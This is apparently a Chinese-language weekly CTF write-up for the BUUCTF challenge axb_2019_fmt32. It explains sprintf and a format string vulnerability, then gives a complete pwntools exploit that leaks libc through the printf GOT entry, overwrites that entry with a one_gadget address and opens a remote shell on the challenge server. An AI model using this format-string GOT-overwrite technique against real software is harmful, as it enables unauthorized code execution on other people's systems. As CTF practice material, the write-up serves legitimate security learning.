# week3
## BUUCTF-axb_2019_fmt32
存在无限格式化字符串漏洞

<img width="704" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/15111b0e-7ad4-4bdf-8cca-44f0e2b2b2b2">

其中，`sprintf()`是一个C语言标准库函数，用于将格式化的字符串写入一个字符数组中。具体来说，它的功能是根据指定的格式字符串，将一组参数按照指定的格式转换成字符串，并将结果存储在一个字符数组中。

`sprintf()`函数的原型如下：

```c
int sprintf(char *str, const char *format, ...);
```

其中，`str`是指向字符数组的指针，用于存储格式化后的字符串；`format`是格式控制字符串；`...`是可选参数，可以是任意数量的变量，用于按照指定格式进行格式化。

`sprintf()`函数返回值是写入字符数组中的字符数，不包括添加的空字符。如果发生错误，返回值为负数。

`sprintf()`函数支持多种格式化选项，包括整数、浮点数、字符、字符串、指针等。例如，`%d`表示整数，`%f`表示浮点数，`%c`表示字符，`%s`表示字符串，`%p`表示指针。格式化字符串中还可以包含转义字符，如`\n`表示换行符，`\t`表示制表符等。

以下是一个示例，将整数和字符串格式化为一个字符串，并将结果存储在一个字符数组中：

```c
#include <stdio.h>

int main() {
    int num = 123;
    char str[] = "Hello, world!";
    char result[100];

    sprintf(result, "Number: %d, String: %s", num, str);

    printf("%s\n", result);

    return 0;
}
```

运行结果为：

```
Number: 123, String: Hello, world!
```

所以在调用printf函数时，会将我们的输入与'Repeater:'拼接起来，成为一个新的参数传递给printf，在计算偏移和已输入的字符个数时要注意

既然有无限制的格式化字符串漏洞利用，那么可以想到通过泄漏libc，然后去修改某个函数的got表为system函数 最后将/bin/sh传递过去

要将/bin/sh传递给system函数，我们必须能够控制该函数的参数，所以首先想到的就是strlen函数，它通过取我们输入的format当作参数

但是仔细观察后发现，这个传递给strlen的参数并不是我们的原始输入，而是拼接了'Repeater:'后的字符串 所以这个办法行不通

那么我们是否可以用one_gadget呢 无需控制参数 只需要修改某个函数的got为one_gadget 即可直接getshell

### exp_axb_2019_fmt32.py
```python
from pwn import *
from LibcSearcher import *
# p = process("./axb_2019_fmt32")
p = remote("node4.buuoj.cn",25633)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

strlen_got = 0x804a024

printf_got = 0x804a014
off_printf = 0x49680
off_strlen = 0x7e520
off_system = 0x3adb0
off_one_gadget1 = 0x3a822
# 0x3ac3e 0x3ac3c 0x3ac42 0x3ac49 0x5faa5 0x5faa6

# 1.leak libc
ru("tell me:")
payload = b'a' + p32(printf_got) + b'%8$s'
sl(payload)

ru("Repeater:a")
rx(4)

libc_printf = u32(rx(4))
success("libc_printf ==> {}".format(hex(libc_printf)))

libc = LibcSearcher("printf",libc_printf)

libc_base = libc_printf - libc.dump("printf")
success("libc_base ==> {}".format(hex(libc_base)))

one_gadget = libc_base + off_one_gadget1
success("one_gadget ==> {}".format(hex(one_gadget)))

# 2.modify printf_got
payload = b'a'
payload+= fmtstr_payload(8, {printf_got:one_gadget}, numbwritten=10, write_size='byte')

ru("tell me:")
raw_input("Ther")
sl(payload)

# 3.getshell
sleep(0.1)
sl("/bin/sh")

shell()
```
